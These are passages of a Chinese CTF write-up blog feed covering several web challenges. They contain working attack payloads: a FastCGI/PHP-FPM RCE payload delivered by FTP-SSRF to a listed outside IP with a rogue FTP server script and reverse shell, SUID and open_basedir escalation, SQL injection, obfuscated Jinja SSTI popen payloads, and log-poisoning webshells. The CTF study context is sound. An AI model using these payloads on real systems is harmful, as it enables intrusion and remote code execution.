$uri\n\n&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$client</span>-&gt;request(<span class="hljs-variable">$params</span>, <span class="hljs-variable">$code</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io/wzimg/339.png" alt="a"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">01</span>%<span class="hljs-number">01</span>%<span class="hljs-number">00</span>%<span class="hljs-number">01</span>%<span class="hljs-number">00</span>%<span class="hljs-number">08</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">01</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">01</span>%<span class="hljs-number">04</span>%<span class="hljs-number">00</span>%<span class="hljs-number">01</span>%<span class="hljs-number">02</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">11</span>%<span class="hljs-number">0</span>BGATEWAY_INTERFACEFastCGI%<span class="hljs-number">2</span>F1.<span class="hljs-number">0</span>%<span class="hljs-number">0</span>E%<span class="hljs-number">04</span>REQUEST_METHODPOST%<span class="hljs-number">0</span>F%<span class="hljs-number">19</span>SCRIPT_FILENAME%<span class="hljs-number">2</span>Fvar%<span class="hljs-number">2</span>Fwww%<span class="hljs-number">2</span>Fhtml%<span class="hljs-number">2</span>Fadd_api.php%<span class="hljs-number">0</span>B%<span class="hljs-number">0</span>CSCRIPT_NAME%<span class="hljs-number">2</span>Fadd_api.php%<span class="hljs-number">0</span>C%<span class="hljs-number">0</span>EQUERY_STRINGcommand%<span class="hljs-number">3</span>Dwhoami%<span class="hljs-number">0</span>B%<span class="hljs-number">1</span>BREQUEST_URI%<span class="hljs-number">2</span>Fadd_api.php%<span class="hljs-number">3</span>Fcommand%<span class="hljs-number">3</span>Dwhoami%<span class="hljs-number">0</span>C%<span class="hljs-number">0</span>CDOCUMENT_URI%<span class="hljs-number">2</span>Fadd_api.php%<span class="hljs-number">09</span>%<span class="hljs-number">80</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%B3PHP_VALUEunserialize_callback_func+%<span class="hljs-number">3</span>D+system%<span class="hljs-number">0</span>Aextension_dir+%<span class="hljs-number">3</span>D+%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">0</span>Aextension+%<span class="hljs-number">3</span>D+hpdoger.so%<span class="hljs-number">0</span>Adisable_classes+%<span class="hljs-number">3</span>D+%<span class="hljs-number">0</span>Adisable_functions+%<span class="hljs-number">3</span>D+%<span class="hljs-number">0</span>Aallow_url_include+%<span class="hljs-number">3</span>D+On%<span class="hljs-number">0</span>Aopen_basedir+%<span class="hljs-number">3</span>D+%<span class="hljs-number">2</span>F%<span class="hljs-number">0</span>Aauto_prepend_file+%<span class="hljs-number">3</span>D+%<span class="hljs-number">0</span>F%<span class="hljs-number">0</span>DSERVER_SOFTWARE80sec%<span class="hljs-number">2</span>Fwofeiwo%<span class="hljs-number">0</span>B%<span class="hljs-number">09</span>REMOTE_ADDR127.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>B%<span class="hljs-number">04</span>REMOTE_PORT9001%<span class="hljs-number">0</span>B%<span class="hljs-number">09</span>SERVER_ADDR127.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>B%<span class="hljs-number">02</span>SERVER_PORT80%<span class="hljs-number">0</span>B%<span class="hljs-number">09</span>SERVER_NAMElocalhost%<span class="hljs-number">0</span>F%<span class="hljs-number">08</span>SERVER_PROTOCOLHTTP%<span class="hljs-number">2</span>F1.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>E%<span class="hljs-number">02</span>CONTENT_LENGTH49%<span class="hljs-number">01</span>%<span class="hljs-number">04</span>%<span class="hljs-number">00</span>%<span class="hljs-number">01</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">01</span>%<span class="hljs-number">05</span>%<span class="hljs-number">00</span>%<span class="hljs-number">01</span>%<span class="hljs-number">001</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp+system%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_REQUEST%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>command%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B+phpinfo%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B+%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">01</span>%<span class="hljs-number">05</span>%<span class="hljs-number">00</span>%<span class="hljs-number">01</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>然后执行以下脚本自己 vps 上搭建一个恶意的 ftp 服务器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">23</span>))<br>s.listen(<span class="hljs-number">1</span>)<br>conn, addr = s.accept()<br>conn.send(<span class="hljs-string">b&#x27;220 welcome\n&#x27;</span>)<br><span class="hljs-comment">#Service ready for new user.</span><br><span class="hljs-comment">#Client send anonymous username</span><br><span class="hljs-comment">#USER anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;331 Please specify the password.\n&#x27;</span>)<br><span class="hljs-comment">#User name okay, need password.</span><br><span class="hljs-comment">#Client send anonymous password.</span><br><span class="hljs-comment">#PASS anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;230 Login successful.\n&#x27;</span>)<br><span class="hljs-comment">#User logged in, proceed. Logged out if appropriate.</span><br><span class="hljs-comment">#TYPE I</span><br>conn.send(<span class="hljs-string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)<br><span class="hljs-comment">#Size /</span><br>conn.send(<span class="hljs-string">b&#x27;550 Could not get the file size.\n&#x27;</span>)<br><span class="hljs-comment">#EPSV (1)</span><br>conn.send(<span class="hljs-string">b&#x27;150 ok\n&#x27;</span>)<br><span class="hljs-comment">#PASV</span><br>conn.send(<span class="hljs-string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="hljs-comment">#STOR / (2)</span><br>conn.send(<span class="hljs-string">b&#x27;150 Permission denied.\n&#x27;</span>)<br><span class="hljs-comment">#QUIT</span><br>conn.send(<span class="hljs-string">b&#x27;221 Goodbye.\n&#x27;</span>)<br>conn.close()<br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io/wzimg/343.png" alt="a"></p><p>然后在 vps 上开启一个 nc 监听，用于接收反弹的shell</p><p>最后通过 eval() 构造如下恶意代码通过 file_put_contents() 函数与我们 VPS 上恶意的 FTP 服务器建立连接：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/add_api.php?backdoor=<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];file_put_contents(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$data</span>);&amp;file=ftp:<span class="hljs-comment">//aaa@47.101.57.72:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></code></pre></td></tr></table></figure><p>此时当 FTP 建立连接后，会通过被动模式将 Payload 重定向到目标主机本地 9001 端口的 PHP-FPM 上，并成功反弹Shell：</p><p><img src="https://woshilnp.github.io/wzimg/342.png" alt="a"></p><p>但是读不了flag</p><p><img src="https://woshilnp.github.io/wzimg/343.png" alt="a">    </p><p>所以接下来就是提权阶段了，最常见的就是 suid 提权了。</p><p>首先查看具有 suid 的命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io/wzimg/346.png" alt="a"></p><p>如上图，发现 php 就有 suid 权限，直接进入交互模式执行代码绕过 open_basedir 后读取 flag 即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">chdir(<span class="hljs-string">&#x27;css&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io/wzimg/344.png" alt="a"></p><p>利用流程：</p><p>FastCGI加载并调用hpdoger.so-&gt;bypass open_basedir-&gt;ftp-ssrf请求恶意ftp服务-&gt;本地php-fpm-&gt;rce</p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><a href="https://whoamianony.top/2021/05/03/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[2021%20%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B]one_Pointer_php/">https://whoamianony.top/2021/05/03/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[2021%20%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B]one_Pointer_php/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NEEPU Sec 2021 公开赛 WP</title>
    <link href="/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/"/>
    <url>/2021/05/26/NEEPU-Sec-2021-%E5%85%AC%E5%BC%80%E8%B5%9B-WP/</url>
    
    <content type="html"><![CDATA[<h2 id="NEEPU-Sec-2021-公开赛-WP"><a href="#NEEPU-Sec-2021-公开赛-WP" class="headerlink" title="[NEEPU Sec 2021 公开赛]WP"></a>[NEEPU Sec 2021 公开赛]WP</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这哪是新生赛呀，<code>web</code>方向题目难度还是特别高的，但是复现之后感觉质量真的挺高的，这里记录下感觉有点意思的题目</p><h3 id="随便注2-0"><a href="#随便注2-0" class="headerlink" title="随便注2.0"></a>随便注2.0</h3><p>这里过滤了上传用了的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|rename|set|handler|char|\*| ||\.&#x2F;i&quot;,$inject);<br></code></pre></td></tr></table></figure><p>但还是先注出一些有用的数据先把：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-number">0</span>%27;show%0ddatabases;%23<br><span class="hljs-number">0</span>%27;show%0dtables;%23<br>得到：<span class="hljs-string">&quot;@Neepu2021招新赛&quot;</span>和<span class="hljs-string">&quot;words&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%<span class="hljs-number">27</span>;show%<span class="hljs-number">0</span>dcolumns%<span class="hljs-number">0</span>dfrom%<span class="hljs-number">0</span>dwords;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io/wzimg/274.png" alt="a"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%<span class="hljs-number">27</span>;show%<span class="hljs-number">0</span>dcolumns%<span class="hljs-number">0</span>dfrom%<span class="hljs-number">0</span>d`@Neepu<span class="hljs-number">2021</span>招新赛`;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p><img src="https://woshilnp.github.io/wzimg/275.png" alt="a"></p><p>但是当我们输入1读取数据的时候，是一个2个数据的数组，所以这里就对应<code>words</code>列里面的字段，即默认查询<code>words</code>里面的数据，原题就可以使用<code>rename</code>把<code>@Neepu2021招新赛</code>修改为<code>words</code>就可以读取了，但这里被过滤了，原题还可以使用PDO预编译，虽然这里过滤了<code>set</code>，但是其实不用<code>set</code>也可以，payload：如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;;PREPARE w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np from concat(&#x27;sel&#x27;,&#x27;ect flag from `@Neepu<span class="hljs-number">2021</span>招新赛`&#x27;);EXECUTE w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>这里是为了看没有绕过空格，使用的时候直接把空格改成<code>%0d</code>即可</p><h3 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h3><p>知识点：</p><p>绕过<code>&#123;&#123;&#125;&#125;` 空格 `.`  `_` 这里可以采用`unicode`的方法进行绕过![a](https://woshilnp.github.io/wzimg/273.png)发现可以利用`&#123;%print%&#125;`绕过`&#123;&#123;&#125;&#125;</code></p><p>然后过滤了关键字，尝试用编码绕过，发现就<code>unicode</code>编码能绕过，大致payload如下：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%print(<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="hljs-number">132</span>][<span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>](<span class="hljs-string">&quot;\u006c\u0073&quot;</span>)[<span class="hljs-string">&quot;\u0072\u0065\u0061\u0064&quot;</span>]())%&#125;<br><br>&#123;%print(<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br>[<span class="hljs-string">&quot;__base__&quot;</span>]<br>[<span class="hljs-string">&quot;__subclasses__&quot;</span>]()<br>[<span class="hljs-number">132</span>][<span class="hljs-string">&quot;__init__&quot;</span>]<br>[<span class="hljs-string">&quot;__globals__&quot;</span>]<br>[<span class="hljs-string">&quot;popen&quot;</span>]<br>(<span class="hljs-string">&quot;ls&quot;</span>)<br>[<span class="hljs-string">&quot;read&quot;</span>]())%&#125;<br></code></pre></td></tr></table></figure><p><code>ls</code>命令可以成功执行，但当我们尝试读取<code>flag</code>的时候却不行，估计过滤了常见命令，可以使用<code>base64 /f*</code>绕过</p><p>最后payload：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%print(<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="hljs-number">132</span>][<span class="hljs-string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>](<span class="hljs-string">&quot;\u0062\u0061\u0073\u0065\u0036\u0034\u0020\u002f\u0066\u002a&quot;</span>)[<span class="hljs-string">&quot;\u0072\u0065\u0061\u0064&quot;</span>]())%&#125;<br><br>&#123;%print(<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br>[<span class="hljs-string">&quot;__base__&quot;</span>]<br>[<span class="hljs-string">&quot;__subclasses__&quot;</span>]()<br>[<span class="hljs-number">132</span>][<span class="hljs-string">&quot;__init__&quot;</span>]<br>[<span class="hljs-string">&quot;__globals__&quot;</span>]<br>[<span class="hljs-string">&quot;popen&quot;</span>]<br>(<span class="hljs-string">&quot;base64 /f*&quot;</span>)<br>[<span class="hljs-string">&quot;read&quot;</span>]())%&#125;<br></code></pre></td></tr></table></figure><p>还有一个读取文件的方法：<code>cut 截断数组带出</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">(<span class="hljs-string">&quot;c&quot;</span><span class="hljs-string">&quot;ut%09-c%092-40%09/fl&quot;</span><span class="hljs-string">&quot;ag&quot;</span>)<br>即(<span class="hljs-string">&quot;cut -c 2-40 /flag&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h3><p>知识点：</p><p>SQL万能密码</p><p>日志包含</p><p>上来一个登录框(只有username)，猜测后台的SQL语句为<code>select * from user where username = &#39;$username&#39;</code>，但是<code>ban</code>了很多字符，如<code>or</code>、<code>||</code>、<code>#</code>、<code>--</code>等等，这里把可以通过<code>a&#39;=&#39;0</code>登陆上去，原理就是<code>username=a</code>为<code>null</code>，<code>null=a</code>为<code>true</code></p><p>然后就是猜正反</p><p>然后查看服务器是<code>nginx</code>服务，就去包含日志文件：<code>/var/log/nginx/access.log</code></p><p>然后就在<code>User-Agent</code>包含一句话木马</p><p>然后连蚂蚁的剑就行了</p><h3 id="serialize-club"><a href="#serialize-club" class="headerlink" title="serialize_club"></a>serialize_club</h3><p>知识点：</p><p>任意文件读取</p><p>反序列化链构造</p><p><code>session_upload_progress</code>构造<code>session</code>反序列化</p><p>无字母<code>webshell</code></p><p><code>getshell</code>提权读取<code>flag</code></p><p>进去查看原代码，发现</p><p><img src="https://woshilnp.github.io/wzimg/280.png" alt="a"></p><p>存在任意文件读取，读取<code>functions/file.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *<span class="hljs-doctag">@author</span>: Ricky</span><br><span class="hljs-comment"> *<span class="hljs-doctag">@function</span>: Read file</span><br><span class="hljs-comment"> *<span class="hljs-doctag">@return</span> string</span><br><span class="hljs-comment"> *<span class="hljs-doctag">@param</span> $filename string</span><br><span class="hljs-comment"> *  <span class="hljs-doctag">@param</span> $dirname string</span><br><span class="hljs-comment"> **/</span><br><br>header(<span class="hljs-string">&#x27;content-type:image/jpeg&#x27;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$dirname</span> = <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\/|\/$|\.\//&#x27;</span>, <span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-variable">$file</span> = file_get_contents(<span class="hljs-variable">$dirname</span>.<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Read fail :(&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现不允许目录穿越，只允许在<code>/var/www/html</code>这里</p><p>然后尝试读取<code>index.php</code>, 发现可以读取同时包含了<code>config/backdoor.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config/backdoor.php&quot;</span>;<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">neepu</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span><br>        <span class="hljs-comment">//! Neepu</span><br>        <span class="hljs-variable">$neepu</span>,<br>        <span class="hljs-comment">//! Memory-held data</span><br>        <span class="hljs-variable">$data</span>,<br>        <span class="hljs-comment">//! Info</span><br>        <span class="hljs-variable">$info</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;neepu = <span class="hljs-string">&quot;&lt;a class=\&quot;navbar-brand\&quot; href=\&quot;index.php\&quot;&gt;Serialize&lt;/a&gt;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>] = <span class="hljs-string">&quot;&lt;a class=\&quot;navbar-brand\&quot; href=\&quot;index.php\&quot;&gt;PHPINFO&lt;/a&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;info&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;neepu;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>];<br>            phpinfo();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;neepu;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>]-&gt;data;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Neepu!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">n33pu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! Neepu func</span><br>        <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable">$Neepu</span> = <span class="hljs-keyword">$this</span>-&gt;func;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Neepu</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dumb</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! dumb</span><br>        <span class="hljs-variable">$dumb</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">silly</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span 